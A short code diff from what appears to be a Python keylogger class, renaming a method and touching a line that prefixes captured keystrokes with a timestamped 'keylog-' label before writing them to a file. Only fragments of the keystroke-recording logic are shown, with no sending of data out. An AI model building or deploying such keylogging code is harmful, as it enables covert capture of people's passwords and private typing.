@@ -25,9 +25,9 @@ class Keylogger:
                 name = f"[{name.upper()}]"
         self.log += name
     
-    def update_filename(self):
+    def update_file(self):
         start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
-        self.log = f"keylog-{start_dt_str} " + self.log
+        self.log = f"keylog-{start_dt_str} " + self.log  
 
     def report_to_file(self):
         # open the file in write mode (create it)
